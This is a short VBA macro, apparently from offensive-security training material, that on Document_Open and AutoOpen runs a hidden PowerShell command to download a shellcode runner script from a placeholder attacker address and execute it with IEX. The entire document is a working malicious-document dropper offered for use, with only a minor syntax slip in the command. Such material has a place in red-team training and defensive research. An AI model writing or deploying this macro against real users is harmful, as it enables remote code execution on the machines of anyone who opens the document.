' This vba script will download and execute our PS shellcode
' runner and execute it when an office document is opened with
' macros enabled.

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient.DownloadString('http://192.168.X.X/shellcode_runner.ps1') |  IEX"
    Shell str, vbHide
End Sub

Sub Document_Open
    MyMacro
End Sub

Sub AutoOpen
    MyMacro
End Sub


